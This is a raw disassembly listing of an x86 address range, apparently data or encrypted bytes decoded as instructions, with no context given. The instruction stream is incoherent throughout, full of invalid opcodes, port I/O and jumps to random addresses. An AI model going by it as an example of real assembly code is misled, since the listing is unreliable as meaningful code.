  424a22:	lds    edi,FWORD PTR [edi-0x1e482c2e]
  424a28:	aam    0xe4
  424a2a:	scas   eax,DWORD PTR es:[edi]
  424a2b:	div    ebp
  424a2d:	xlat   BYTE PTR ds:[ebx]
  424a2e:	idiv   ah
  424a30:	cmc    
  424a31:	mov    edi,0xdad5eefc
  424a36:	in     eax,dx
  424a37:	in     al,dx
  424a38:	jmp    0x424a34
  424a3a:	out    0xda,eax
  424a3c:	les    eax,FWORD PTR [edx]
  424a3e:	cli    
  424a3f:	or     ecx,DWORD PTR ds:0xc4e6c8ce
  424a45:	mov    cl,0xee
  424a47:	jecxz  0x424a00
  424a49:	(bad)  
  424a4a:	into   
  424a4b:	aam    0xea
  424a4d:	mov    bh,0xd4
  424a4f:	(bad)  
  424a51:	repz lock aad 0xd6
  424a55:	ret    
  424a56:	add    eax,esi
  424a58:	loopne 0x424a31
  424a5a:	clc    
  424a5b:	cli    
  424a5c:	(bad)  
  424a5e:	loope  0x424a6d
  424a60:	call   0xc4fb3143
  424a65:	retf   0xc0f2
  424a68:	mov    dh,0xb4
  424a6b:	(bad)  
  424a6c:	cmc    
  424a6d:	lods   al,BYTE PTR ds:[esi]
  424a6e:	sar    ebp,1
  424a70:	jmp    0x424a6c
  424a72:	add    dh,al
  424a74:	div    bl
  424a76:	sti    
  424a77:	in     eax,0xfb
  424a79:	cli    
  424a7a:	test   BYTE PTR [ebx],0xde
  424a7d:	iret   
  424a7e:	or     al,0x1
  424a80:	in     al,dx
  424a81:	icebp  
  424a82:	test   eax,0xedb0cfb8
  424a87:	call   0xf01c2039
  424a8c:	leave  
  424a8d:	lods   al,BYTE PTR ds:[esi]
  424a8e:	aad    0xf9
  424a90:	cmc    
  424a91:	fdivr  QWORD PTR [edx+edi*8-0x501071d]
  424a98:	neg    bl
  424a9a:	fstp   st(6)
  424a9c:	iret   
  424a9d:	or     eax,0xc0cccb0b
  424aa2:	in     al,dx
  424aa3:	test   eax,0xaec9ade1
  424aa8:	(bad)  
  424aa9:	rol    ah,cl
  424aab:	scas   al,BYTE PTR es:[edi]
  424aac:	rcl    ch,1
  424aae:	int3   
  424aaf:	enter  0xdac9,0xfb
  424ab3:	into   
  424ab4:	mov    ch,0xb8
  424ab6:	mov    DWORD PTR [edx+ebp*8],0xfac0e3df
  424abd:	or     ecx,ebx
  424abf:	add    DWORD PTR [eax],ecx
  424ac1:	int3   
  424ac2:	stos   BYTE PTR es:[edi],al
  424ac3:	(bad)  
  424ac4:	(bad)  
  424ac6:	jmp    0xd53c39a1
  424acb:	mov    ecx,0xf3c5b8e6
  424ad0:	in     al,dx
  424ad1:	(bad)  
  424ad2:	repnz rcl dh,1
  424ad5:	add    bl,ah
  424ad7:	out    0xfb,al
  424ad9:	shl    esp,1
  424adb:	jecxz  0x424aa6
  424add:	push   es
  424ade:	(bad)  
  424adf:	into   
  424ae0:	(bad)  [edi]
  424ae2:	(bad)  
  424ae4:	jmp    0xb8313898
  424ae9:	lods   al,BYTE PTR ds:[esi]
  424aea:	int    0xd3
  424aec:	mov    edi,0xd8f9efe5
  424af1:	fnstsw WORD PTR [ecx-0x2e2c3ffe]
  424af7:	(bad)  
  424af8:	test   BYTE PTR [ebx],0xc4
  424afb:	(bad)  
  424afc:	fisttp DWORD PTR [ebx]
  424afe:	loope  0x424b0e
  424b00:	in     al,dx
  424b01:	fidivr WORD PTR [edi-0x32511816]
  424b07:	(bad)  
  424b08:	loopne 0x424b00
  424b0a:	iret   
  424b0b:	retf   
  424b0c:	(bad)  
  424b0d:	fmulp  st(4),st
  424b0f:	in     al,0xed
  424b11:	jmp    0xbe04:0xfdfdfaef
  424b18:	repz mov esp,0xd5d503c9
  424b1e:	add    ebp,ebx
  424b20:	call   0xc5313de9
  424b25:	retf   0xd0ea
  424b28:	loop   0x424ae4
  424b2a:	out    dx,eax
  424b2b:	loopne 0x424b04
  424b2d:	rcl    ecx,cl
  424b2f:	mov    edi,0xe8f301b9
  424b34:	clc    
  424b35:	ret    0xd9d6
  424b38:	push   es
  424b39:	aad    0xe9
  424b3b:	imul   dh
  424b3d:	into   
  424b3e:	push   es
  424b3f:	int3   
  424b40:	cli    
  424b41:	call   0xde271532
  424b46:	aam    0xf7
  424b48:	loopne 0x424b44
  424b4a:	in     eax,0xc0
  424b4c:	repz jmp 0x2fa:0xdfcdcfd5
  424b54:	sti    
  424b55:	mov    ah,0xc0
  424b57:	pop    es
  424b58:	cmc    
  424b59:	jmp    0xcacd:0x6e9ddc2
  424b60:	sar    esi,cl
  424b62:	(bad)  
  424b63:	shr    DWORD PTR [esi-0x140d0b53],cl
  424b69:	shl    bh,1
  424b6b:	jmp    0xfeeb:0xbdfcfacf
  424b72:	std    
  424b73:	fiadd  DWORD PTR [esi]
  424b75:	(bad)  
  424b76:	mov    esp,0xc2fbd1db
  424b7b:	aam    0xd4
  424b7d:	fmul   st(2),st
  424b7f:	out    0xfd,al
  424b81:	call   0xdeff284c
  424b86:	stos   DWORD PTR es:[edi],eax
  424b87:	mov    dh,0xef
  424b89:	repz fcmove st,st(2)
  424b8c:	jmp    0xf23d274f
  424b91:	int    0xcc
  424b93:	loopne 0x424b84
  424b95:	mov    esi,0xddfee0bc
  424b9a:	std    
  424b9b:	add    cl,al
  424b9d:	or     al,bl
  424b9f:	clc    
  424ba0:	or     esi,edi
  424ba2:	stos   BYTE PTR es:[edi],al
  424ba3:	mov    edi,0xc2b6c9df
  424ba8:	out    dx,eax
  424ba9:	fcmove st,st(0)
  424bab:	iret   
  424bac:	jmp    0xf2ec:0xd2ecd9ed
  424bb3:	push   edi
  424bb5:	add    ebx,edi
  424bb7:	add    ebx,esp
  424bb9:	(bad)  
  424bba:	cli    
  424bbb:	jmp    0xed494ebc
  424bc0:	(bad)  
  424bc2:	vpor   ymm2,ymm3,ymm7
  424bc6:	loopne 0x424b9e
  424bc8:	mov    dl,0xd0
  424bca:	iret   
  424bcb:	mov    cl,0xb1
  424bcd:	mov    edi,0xe2e3ebba
  424bd2:	mov    bh,0xee
  424bd4:	icebp  
  424bd5:	aad    0xed
  424bd7:	fcomip st,st(2)
  424bd9:	xlat   BYTE PTR ds:[ebx]
  424bda:	(bad)  
  424bdb:	leave  
  424bdc:	push   cs
  424bdd:	enter  0x50e,0xb
  424be1:	ror    dl,0xcf
  424be4:	not    edi
  424be6:	mov    esp,0xc1d6f4bc
  424beb:	mov    ah,0xca
  424bed:	shl    edx,cl
  424bef:	mov    edi,0xefc3daf6
  424bf4:	inc    ecx
  424bf6:	stc    
  424bf7:	fcmovnb st,st(7)
  424bf9:	jmp    0x424bdd
  424bfb:	lock (bad) 
  424bfd:	loopne 0x424be1
  424bff:	add    ecx,ebp
  424c01:	out    dx,eax
  424c02:	stos   DWORD PTR es:[edi],eax
  424c03:	retf   0xc7b2
  424c06:	in     al,0xdc
  424c08:	lods   al,BYTE PTR ds:[esi]
  424c09:	into   
  424c0a:	in     eax,dx
  424c0b:	shl    BYTE PTR [esi-0xafc2338],cl
  424c11:	imul   ecx
  424c13:	cli    
  424c14:	icebp  
  424c15:	fucomp st(5)
  424c17:	in     eax,0xfe
  424c19:	fucomp st(2)
  424c1b:	in     eax,0x7
  424c1d:	fnclex 
  424c1f:	clc    
  424c20:	(bad)
  424c23:	out    0xdc,al
  424c25:	fnsave [ebx-0x5064d38]
  424c2b:	mov    dh,0xe8
  424c2d:	ffreep st(4)
  424c2f:	out    dx,al
  424c30:	aam    0xbb
  424c32:	in     al,dx
  424c33:	repz in eax,dx
  424c35:	stc    
  424c36:	mov    esp,0x6d6f2de
  424c3b:	or     bh,ah
  424c3d:	(bad)  
  424c3e:	in     al,dx
  424c3f:	int    0xcb
  424c41:	out    0xa7,al
  424c43:	jmp    0xead3:0xcce4cbe9
  424c4a:	(bad)  
  424c4b:	hlt    
  424c4c:	hlt    
  424c4d:	mov    ch,0xec
  424c4f:	stc    
  424c50:	(bad)  
  424c52:	out    dx,eax
  424c53:	std    
  424c54:	add    esi,esi
  424c56:	aad    0xc2
  424c58:	icebp  
  424c59:	add    esi,ecx
  424c5b:	test   dl,0xc9
  424c5e:	(bad)  
  424c5f:	(bad)  
  424c60:	sti    
  424c61:	adc    edi,ebx
  424c63:	out    0xe4,al
  424c65:	retf   
  424c66:	(bad)  
  424c67:	jmp    0xe13a1659
  424c6c:	hlt    
  424c6d:	mov    al,0xef
  424c6f:	iret   
  424c70:	mov    esp,0x2fef7f2
  424c75:	fucomi st,st(5)
  424c77:	lock sti 
  424c79:	shl    ch,1
  424c7b:	clc    
  424c7c:	sti    
  424c7d:	cld    
  424c7e:	fsubrp st(6),st
  424c80:	add    eax,0xd6c3a7c4
  424c85:	scas   al,BYTE PTR es:[edi]
  424c86:	int3   
  424c87:	shl    bl,1
  424c89:	cli    
  424c8a:	int3   
  424c8b:	repz retf 0xe8ba
  424c8f:	cld    
  424c90:	jmp    0xf43c4958
  424c95:	ret    
  424c96:	(bad)  
  424c97:	hlt    
  424c98:	stc    
  424c99:	(bad)  
  424c9a:	in     eax,0xe0
  424c9c:	les    eax,FWORD PTR ds:0xf10406e7
  424ca2:	faddp  st(7),st
  424ca4:	scas   eax,DWORD PTR es:[edi]
  424ca5:	(bad)  
  424ca7:	mov    edx,0xdbf6c5a8
  424cad:	fxch   st(5)
  424caf:	jmp    0xcdfa:0xf6efb0d5
  424cb6:	rcr    ebx,cl
  424cb8:	lds    ecx,FWORD PTR [ecx]
  424cba:	push   es
  424cbb:	call   0xe61f52a8
  424cc0:	cli    
  424cc1:	loop   0x424c9f
  424cc3:	shr    DWORD PTR [ecx-0x1b17185c],cl
  424cc9:	test   edx,0xf3becef6
  424ccf:	lock sti 
  424cd1:	loop   0x424c9f
  424cd3:	into   
  424cd4:	(bad)  
  424cd6:	icebp  
  424cd7:	ret    
  424cd8:	cli    
  424cd9:	(bad)  
  424cda:	or     DWORD PTR [edx],eax
  424cdc:	in     al,0xce
  424cde:	out    dx,al
  424cdf:	add    ecx,DWORD PTR [edi]
  424ce1:	or     ecx,esp
  424ce3:	lods   eax,DWORD PTR ds:[esi]
  424ce4:	in     al,dx
  424ce5:	lock rcl al,1
  424ce8:	fcmovbe st,st(5)
  424cea:	in     al,0xb7
  424cec:	int    0xfe
  424cee:	repnz mov ecx,0xd9d5dad9
  424cf4:	imul   ah
  424cf6:	jecxz  0x424cba
  424cf8:	or     esp,esp
  424cfa:	fsub   st(3),st
  424cfc:	pop    es
  424cfd:	in     al,0xfb
  424cff:	add    ch,al
  424d01:	or     eax,0xedbef0dc
  424d06:	ror    bl,1
  424d08:	jmp    0xd9fe:0xe4ffc7c1
  424d0f:	jmp    0xf1fe25d0
  424d14:	mov    ebp,0xc5dcede2
  424d19:	in     eax,0x6
  424d1b:	idiv   edi
  424d1d:	jmp    0x81a5b03
  424d22:	ret    0xecd8
  424d25:	(bad)  
  424d26:	out    0xd1,al
  424d28:	in     eax,0xc7
  424d2a:	repnz (bad) 
  424d2d:	sar    ch,1
  424d2f:	into   
  424d30:	fucomp st(7)
  424d32:	jecxz  0x424d21
  424d34:	cli    
  424d35:	loop   0x424d19
  424d37:	repz jmp 0x424d21
  424d3a:	pop    es
  424d3b:	shl    al,0xed
  424d3e:	hlt    
  424d3f:	fisttp QWORD PTR [ebx]
  424d41:	shr    ecx,cl
  424d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d44:	(bad)  
  424d45:	in     eax,dx
  424d46:	mov    esp,0xe5c4d2b2
  424d4b:	out    dx,al
  424d4c:	iret   
  424d4d:	cmc    
  424d4e:	mov    ebx,0xefeddcfc
  424d53:	fadd   st(7),st
  424d55:	cld    
  424d56:	std    
  424d57:	add    eax,0xfbe1d6e7
  424d5c:	(bad)  
  424d5d:	jmp    0xe7d0:0xf302fde9
  424d64:	repnz repnz ror bh,0xf0
  424d69:	test   al,0xc8
  424d6b:	mov    bh,0xe7
  424d6d:	fst    st(3)
  424d6f:	rol    bl,1
  424d71:	icebp  
  424d72:	mov    ebp,0xdde203db
  424d77:	mov    edx,0xe5c5c1fe
  424d7c:	in     al,0xd8
  424d7e:	or     al,BYTE PTR [eax]
  424d80:	out    dx,al
  424d81:	repz shr DWORD PTR [eax+ebp*8-0x1c511e35],cl
  424d89:	sti    
  424d8a:	rcl    dh,1
  424d8c:	enter  0xcab7,0xbb
  424d90:	leave  
  424d91:	fdivr  st(5),st
  424d93:	mov    esp,0xfef6c7f8
  424d98:	rol    ebx,cl
  424d9a:	or     eax,eax
  424d9c:	mov    DWORD PTR [edx],0xf209fae7
  424da2:	out    0xed,eax
  424da4:	icebp  
  424da5:	icebp  
  424da6:	jmp    0xfa121c9e
  424dab:	in     al,dx
  424dac:	in     eax,dx
  424dad:	retf   
  424dae:	cmc    
  424daf:	repz repnz fcomp st(4)
  424db3:	shl    dl,cl
  424db5:	in     al,dx
  424db6:	sti    
  424db7:	icebp  
  424db8:	in     eax,0xf6
  424dba:	or     edi,esp
  424dbc:	loope  0x424d97
  424dbe:	(bad)  
  424dbf:	or     eax,DWORD PTR [edx]
  424dc1:	cld    
  424dc2:	fadd   st,st(1)
  424dc4:	in     eax,0xc7
  424dc6:	scas   al,BYTE PTR es:[edi]
  424dc7:	icebp  
  424dc8:	test   eax,0xcac7d1ee
  424dcd:	retf   
  424dce:	int3   
  424dcf:	sti    
  424dd0:	clc    
  424dd1:	mov    ah,0xe3
  424dd3:	cmc    
  424dd4:	rcl    esi,cl
  424dd6:	add    eax,0xe6d4d1c1
  424ddb:	fsub   st,st(7)
  424ddd:	add    al,0x0
  424ddf:	jmp    0xf3f6:0xccf1cf09
  424de6:	jmp    0xc9352ec7
  424deb:	cmc    
  424dec:	mov    ebx,0xdafaecfd
  424df1:	shl    esi,1
  424df3:	lock std 
  424df5:	sar    dl,0xfd
  424df8:	fcomp  st(2)
  424dfa:	aam    0xfc
  424dfc:	(bad)  
  424dfe:	(bad)  
  424dff:	or     DWORD PTR [edx],eax
  424e01:	add    al,0xf1
  424e03:	fdiv   st,st(0)
  424e05:	scas   eax,DWORD PTR es:[edi]
  424e06:	iret   
  424e07:	in     eax,dx
  424e08:	(bad)  
  424e09:	mov    ch,0xe6
  424e0b:	(bad)  
  424e0d:	retf   
  424e0e:	sar    BYTE PTR [edi-0x8434327],cl
  424e14:	jecxz  0x424dd6
  424e16:	(bad)  
  424e17:	or     edi,esi
  424e19:	rol    ecx,1
  424e1b:	leave  
  424e1c:	enter  0xf5f9,0x2
  424e20:	enter  0xadc8,0xf0
  424e24:	retf   
  424e25:	mov    bh,0xe5
  424e27:	repnz fcmove st,st(1)
  424e2a:	ror    ecx,1
  424e2c:	lods   eax,DWORD PTR ds:[esi]
  424e2d:	(bad)  
  424e2e:	retf   0xdcd7
  424e31:	loop   0x424df0
  424e33:	shr    esp,1
  424e35:	fcmovnu st,st(5)
  424e37:	lock (bad) 
  424e3a:	mov    ch,0xde
  424e3d:	jmp    0xe3cd:0xc8c4dd09
  424e44:	mov    esp,0xc4e7ccd1
  424e49:	jmp    0xedb8:0xace6b7c7
  424e50:	mov    cl,0xb9
  424e52:	add    al,dl
  424e54:	loope  0x424e4c
  424e56:	mov    ebx,0xe0c0fcc3
  424e5b:	(bad)  
  424e5c:	loop   0x424e33
  424e5e:	(bad)  
  424e5f:	aam    0xfd
  424e61:	add    al,ch
  424e63:	lods   eax,DWORD PTR ds:[esi]
  424e64:	ffreep st(5)
  424e66:	aam    0xd5
  424e68:	cmc    
  424e69:	out    0xc1,al
  424e6b:	int3   
  424e6c:	test   ch,0xe9
  424e6f:	(bad)  
  424e71:	jmp    0xd4c5:0xecfaf6ec
  424e78:	(bad)  
  424e79:	fisttp WORD PTR [eax]
  424e7b:	enter  0x1c5,0xa
  424e7f:	cld    
  424e80:	jecxz  0x424e54
  424e82:	fst    st(7)
  424e84:	test   al,0xc6
  424e86:	(bad)  
  424e87:	(bad)  
  424e89:	iret   
  424e8a:	int3   
  424e8b:	lock inc dh
  424e8e:	mov    eax,0xe2f4f0ef
  424e93:	iret   
  424e94:	cmc    
  424e95:	fsubrp st(6),st
  424e97:	out    0xff,eax
  424e99:	lock ror bl,1
  424e9c:	jmp    0xda4d476c
  424ea1:	out    dx,eax
  424ea2:	rcr    dh,cl
  424ea4:	mov    bl,0xa8
  424ea6:	(bad)  
  424ea7:	shl    dl,cl
  424ea9:	xlat   BYTE PTR ds:[ebx]
  424eaa:	mov    edx,0xf0d4e6f5
  424eaf:	mov    edx,0xf1c8c8b1
  424eb4:	mov    ch,0xc0
  424eb6:	fndisi(8087 only) 
  424eb8:	stc    
  424eb9:	fnstsw WORD PTR [edi-0x30221f1d]
  424ebf:	out    dx,eax
  424ec0:	in     eax,0x13
  424ec2:	in     al,dx
  424ec3:	(bad)  
  424ec4:	retf   0xc1f7
  424ec7:	ret    
  424ec8:	out    dx,al
  424ec9:	(bad)
  424ecc:	in     eax,0xdb
  424ece:	aam    0xfe
  424ed0:	hlt    
  424ed1:	fdivr  st(7),st
  424ed3:	out    dx,eax
  424ed4:	fcmovnbe st,st(1)
  424ed6:	repnz out 0xd2,al
  424ed9:	idiv   ebx
  424edb:	retf   0xeee7
  424ede:	fdiv   st(5),st
  424ee0:	(bad)  
  424ee2:	test   eax,0xebd6c2d3
  424ee7:	cmc    
  424ee8:	enter  0xd1f3,0xc8
  424eec:	mov    al,0xf7
  424eee:	jmp    0xefe2:0xf6cecfdd
  424ef5:	ret    0x3f9
  424ef8:	fsub   st,st(0)
  424efa:	add    esp,eax
  424efc:	fucomi st,st(1)
  424efe:	add    bh,cl
  424f00:	(bad)  
  424f02:	test   al,0xf1
  424f04:	out    0xd0,al
  424f06:	lods   al,BYTE PTR ds:[esi]
  424f07:	shl    ch,cl
  424f09:	repz clc 
  424f0b:	leave  
  424f0c:	fdivrp st(3),st
  424f0e:	cli    
  424f0f:	mov    esi,0xfafed1b5
  424f14:	repnz mov esi,0xe5c502e0
  424f1a:	fsubp  st(2),st
  424f1c:	rcl    esi,0xd8
  424f1f:	or     ebp,edx
  424f21:	cld    
  424f22:	mov    esp,0xd3a4d6d7
  424f27:	loop   0x424edb
  424f29:	aad    0xd6
  424f2b:	jmp    0x424f2c
  424f2d:	icebp  
  424f2e:	mov    eax,0xd3bafbcf
  424f33:	call   0x5090c06
  424f38:	add    ch,bl
  424f3a:	fsubr  st(0),st
  424f3c:	add    eax,0xf9c4cdf9
  424f41:	leave  
  424f42:	ret    0xd6a6
  424f45:	mov    bl,0xf3
  424f47:	in     eax,dx
  424f48:	mov    bl,0xe6
  424f4a:	(bad)  
  424f4b:	out    dx,eax
  424f4c:	sti    
  424f4d:	sar    dh,1
  424f4f:	fsubr  st,st(4)
  424f51:	add    edi,ebx
  424f53:	add    dh,ah
  424f55:	mov    ah,0xfe
  424f57:	cli    
  424f58:	fadd   DWORD PTR [eax]
  424f5a:	pop    es
  424f5b:	cli    
  424f5c:	push   cs
  424f5d:	pandn  mm4,mm5
  424f60:	call   0xe12ef93e
  424f65:	lods   al,BYTE PTR ds:[esi]
  424f66:	loopne 0x424f54
  424f68:	into   
  424f69:	iret   
  424f6a:	sti    
  424f6b:	into   
  424f6c:	jmp    0xba14442b
  424f71:	(bad)  
  424f72:	in     al,dx
  424f73:	shl    bh,cl
  424f75:	(bad)  
  424f77:	fadd   st,st(4)
  424f79:	out    0xc7,al
  424f7b:	(bad)  
  424f7c:	push   es
  424f7d:	aad    0xc
  424f7f:	jmp    0xef1b344d
  424f84:	out    dx,al
  424f85:	(bad)
  424f88:	loope  0x424f60
  424f8a:	sti    
  424f8b:	in     al,dx
  424f8c:	sti    
  424f8d:	dec    edx
  424f8f:	test   edx,0xf7dcfef1
  424f95:	add    ah,dl
  424f97:	add    DWORD PTR [edi],eax
  424f99:	mov    esp,0xddcae5f1
  424f9e:	or     ecx,DWORD PTR [ecx+ebp*8]
  424fa1:	add    al,0xd9
  424fa3:	shl    eax,1
  424fa5:	int    0xf7
  424fa7:	mov    bl,0xac
  424fa9:	shl    BYTE PTR [edx-0x11124547],0xff
  424fb0:	xlat   BYTE PTR ds:[ebx]
  424fb1:	mov    ecx,0xf2e7cece
  424fb6:	mov    ebp,0xc3fefec7
  424fbb:	add    al,0xcf
  424fbd:	fxch   st(7)
  424fbf:	add    ch,dl
  424fc1:	cli    
  424fc2:	stos   BYTE PTR es:[edi],al
  424fc3:	repz jmp 0xb42430a7
  424fc9:	shl    ebp,cl
  424fcb:	mov    eax,0xfce4fee6
  424fd0:	call   0xf1411eca
  424fd5:	(bad)  
  424fd6:	loope  0x424fbe
  424fd8:	repz lock cld 
  424fdb:	(bad)  
  424fdd:	leave  
  424fde:	in     eax,0xdc
  424fe0:	push   cs
  424fe1:	push   cs
  424fe2:	shl    edx,cl
  424fe4:	mov    esp,0xc1c2edd7
  424fe9:	out    dx,eax
  424fea:	mov    edx,0xddf8f7e0
  424fef:	fdiv   DWORD PTR [ecx-0x260e2d41]
  424ff5:	cmc    
  424ff6:	div    al
  424ff8:	in     eax,0xd9
  424ffa:	push   es
  424ffb:	hlt    
  424ffc:	out    dx,eax
  424ffd:	add    al,BYTE PTR [esi]
  424fff:	fild   WORD PTR [edx]
  425001:	out    dx,eax
  425002:	loope  0x424fc0
  425004:	test   al,0xde
  425006:	loop   0x424ffb
  425008:	neg    dl
  42500a:	test   dh,0xdf
  42500d:	in     al,0xec
  42500f:	rcl    ch,1
  425011:	add    ebp,edx
  425013:	mov    edx,0xe3d5f8d3
  425018:	cld    
  425019:	jmp    0xfd244b28
  42501e:	cld    
  42501f:	fcmove st,st(0)
  425021:	add    eax,0xc3f7a8e1
  425026:	mov    bh,0xc8
  425028:	in     eax,0xef
  42502a:	ror    ch,1
  42502c:	repnz mov dh,0xfb
  42502f:	mov    edx,0xfed6dbbe
  425034:	mov    ch,0xd2
  425036:	stc    
  425037:	ret    
  425038:	mov    ebp,0xb0f08c5
  42503d:	add    al,0xde
  42503f:	add    eax,0xf3befad3
  425044:	int    0xce
  425046:	retf   
  425047:	neg    bl
  425049:	repnz (bad) 
  42504b:	mov    eax,0xd6f2d7f0
  425050:	(bad)  
  425052:	mul    eax
  425054:	shl    ebx,0xdd
  425057:	in     eax,0xc6
  425059:	(bad)  
  42505b:	retf   
  42505c:	jmp    0xec311545
  425061:	in     eax,0xf2
  425063:	out    0xc4,eax
  425065:	(bad)  
  425066:	repz into 
  425068:	(bad)  
  425069:	mov    dl,0xd1
  42506b:	stc    
  42506c:	jmp    0xf4d2:0xe2fbc4e4
  425073:	xlat   BYTE PTR ds:[ebx]
  425074:	ror    dh,0xbc
  425077:	in     al,dx
  425078:	aad    0xd5
  42507a:	cld    
  42507b:	add    bl,bh
  42507d:	(bad)  
  42507e:	into   
  42507f:	enter  0xd2ec,0xce
  425083:	mov    ebp,0xb5aef3cd
  425088:	ror    dh,1
  42508a:	out    dx,eax
  42508b:	mov    edx,0xfbcde4ec
  425090:	(bad)  
  425092:	mov    esp,0x3fc06fa
  425097:	mov    ebp,0xeac20ad4
  42509c:	sar    esi,0x8
  42509f:	jmp    0x4250a5
  4250a1:	loop   0x42505f
  4250a3:	mov    ebp,0xd3b0adb2
  4250a8:	cli    
  4250a9:	(bad)  
  4250aa:	test   bh,0xb0
  4250ad:	rcl    eax,1
  4250af:	cli    
  4250b0:	mov    edx,0xf9d3b8f6
  4250b5:	out    0xd9,eax
  4250b7:	xlat   BYTE PTR ds:[ebx]
  4250b8:	(bad)
  4250bb:	out    0xf7,al
  4250bd:	fsubrp st(0),st
  4250bf:	loop   0x4250a9
  4250c1:	(bad)  
  4250c3:	test   eax,0xe2eaf7f0
  4250c8:	fcmove st,st(6)
  4250ca:	(bad)  
  4250cb:	(bad)  
  4250cd:	fcmovnbe st,st(0)
  4250cf:	sar    DWORD PTR [edi+0x1ffdec3],cl
  4250d5:	cli    
  4250d6:	(bad)  
  4250d8:	std    
  4250d9:	in     eax,0x9
  4250db:	imul   ebx
  4250dd:	lds    eax,FWORD PTR [edx]
  4250df:	pop    es
  4250e0:	fld    QWORD PTR [eax]
  4250e2:	fcomip st,st(1)
  4250e4:	(bad)
  4250e7:	(bad)  
  4250e8:	lods   eax,DWORD PTR ds:[esi]
  4250e9:	aam    0xb7
  4250eb:	shl    esi,1
  4250ed:	mov    dh,0xb9
  4250ef:	mov    dl,0xce
  4250f1:	not    ebp
  4250f3:	fsub   st(4),st
  4250f5:	loopne 0x4250be
  4250f7:	in     al,0xf7
  4250f9:	in     al,0x8
  4250fb:	fadd   DWORD PTR [edx]
  4250fd:	add    ah,ah
  4250ff:	iret   
  425100:	or     ebp,ebx
  425102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425103:	jmp    0x4250f4
  425105:	loopne 0x4250e7
  425107:	jmp    0xce162603
  42510c:	mov    ah,0xb7
  42510e:	ror    ecx,cl
  425110:	(bad)  
  425111:	loope  0x4250db
  425113:	loope  0x425114
  425115:	xlat   BYTE PTR ds:[ebx]
  425116:	int3   
  425117:	add    bh,al
  425119:	in     al,0xb
  42511b:	cmc    
  42511c:	mov    ebp,0x12cccbda
  425121:	fcomip st,st(1)
  425123:	mov    ebp,0xe2e0beb2
  425128:	loopne 0x425113
  42512a:	(bad)  
  42512b:	mov    ah,0xf7
  42512d:	retf   
  42512e:	in     eax,dx
  42512f:	ror    ecx,cl
  425131:	xlat   BYTE PTR ds:[ebx]
  425132:	mov    esi,0xdae3fdc3
  425137:	mov    edx,0x1d7d2c5
  42513c:	(bad)  
  42513e:	loopne 0x425133
  425140:	add    cl,dh
  425142:	mov    eax,0xabf0adf1
  425147:	into   
  425148:	icebp  
  425149:	iret   
  42514a:	iret   
  42514b:	int    0xad
  42514d:	mov    edx,0xf8fcbebd
  425152:	call   0xda134e44
  425157:	lock shl ecx,1
  42515a:	ret    
  42515b:	mov    BYTE PTR [eax],0xe0
  42515e:	loope  0x42514a
  425160:	int    0xc
  425162:	iret   
  425163:	mov    esi,0xb3afe1ce
  425168:	ror    dh,1
  42516a:	mov    dl,0xb6
  42516c:	mov    ch,0xf7
  42516e:	div    ecx
  425170:	(bad)  
  425172:	(bad)  
  425173:	mov    dh,0xd2
  425175:	mov    esi,0xfcd703d1
  42517a:	shl    esp,0xe1
  42517d:	mov    esp,0xe5cfe0e2
  425182:	out    dx,al
  425183:	leave  
  425184:	test   ch,0xd3
  425187:	loop   0x425136
  425189:	out    0xe9,al
  42518b:	call   0xcf3d246b
  425190:	in     eax,dx
  425191:	loope  0x42518b
  425193:	fcomi  st,st(2)
  425195:	xlat   BYTE PTR ds:[ebx]
  425196:	fmul   QWORD PTR [ebx]
  425198:	ror    DWORD PTR [edx],1
  42519a:	add    cl,cl
  42519c:	loopne 0x42517e
  42519e:	fisttp WORD PTR [edi]
  4251a0:	fdivp  st(4),st
  4251a2:	in     al,dx
  4251a3:	in     al,dx
  4251a4:	iret   
  4251a5:	rol    cl,0xcd
  4251a8:	in     al,0xd0
  4251aa:	fdiv   st,st(1)
  4251ac:	(bad)  
  4251ae:	cli    
  4251af:	(bad)  
  4251b1:	inc    dl
  4251b3:	in     eax,dx
  4251b4:	sar    BYTE PTR [esi-0x3d0ef908],cl
  4251ba:	fcmovnb st,st(7)
  4251bc:	pop    es
  4251bd:	out    0xc9,al
  4251bf:	or     edx,ebp
  4251c1:	out    0xa7,al
  4251c3:	in     eax,0xf1
  4251c5:	mov    esi,0xf0c5f4f0
  4251ca:	mov    al,0xc5
  4251cc:	out    dx,al
  4251cd:	in     eax,dx
  4251ce:	jmp    0x425198
  4251d0:	sti    
  4251d1:	ret    0xd1e1
  4251d4:	ret    
  4251d5:	jecxz  0x4251d3
  4251d7:	(bad)  
  4251da:	fucomi st,st(0)
  4251dc:	aam    0xee
  4251de:	or     eax,0xe2f9c1f8
  4251e3:	call   0xad2a1d9a
  4251e8:	into   
  4251e9:	lock (bad) 
  4251eb:	test   ah,0xfa
  4251ee:	out    dx,eax
  4251ef:	retf   0x1da
  4251f2:	add    edi,esi
  4251f4:	clc    
  4251f5:	in     eax,0xf4
  4251f7:	div    dl
  4251f9:	retf   
  4251fa:	ror    al,0xe0
  4251fd:	jecxz  0x4251e3
  4251ff:	loop   0x4251ec
  425201:	add    ch,ch
  425203:	retf   0xeec2
  425206:	jmp    0xdfd4:0xb7f9edce
  42520d:	out    dx,al
  42520e:	into   
  42520f:	mov    esi,0xd6e1feb4
  425214:	aad    0xdc
  425216:	in     al,dx
  425217:	rol    ah,1
  425219:	rcr    bl,0xea
  42521c:	loop   0x4251ed
  42521e:	loop   0x4251e6
  425220:	std    
  425221:	repnz into 
  425223:	mov    esi,0xdcc8d6c3
  425228:	lods   al,BYTE PTR ds:[esi]
  425229:	int3   
  42522a:	lock sti 
  42522c:	lods   eax,DWORD PTR ds:[esi]
  42522d:	sar    DWORD PTR [esi-0x2628452a],1
  425233:	mov    esp,0xc0e1d6dd
  425238:	fxch   st(3)
  42523a:	out    0xc4,eax
  42523c:	hlt    
  42523d:	(bad)
  425240:	(bad)  
  425242:	scas   al,BYTE PTR es:[edi]
  425243:	out    0xee,eax
  425245:	retf   
  425246:	out    0xdb,al
  425248:	lock sti 
  42524a:	fdivr  DWORD PTR [ecx-0x16454531]
  425250:	(bad)  
  425251:	jmp    0xe0e7:0xfaefe000
  425258:	sar    cl,1
  42525a:	add    edi,eax
  42525c:	cld    
  42525d:	add    ecx,DWORD PTR [edx]
  42525f:	iret   
  425260:	int    0xce
  425262:	mov    esi,0xf4b2e9e4
  425267:	(bad)  
  425268:	int    0xd5
  42526a:	fcmovne st,st(7)
  42526c:	sar    BYTE PTR [edi-0x210f142b],cl
  425272:	lock repnz mov eax,0xf7c4e4d8
  425279:	loopne 0x42523a
  42527b:	mov    esi,0xde2fefd
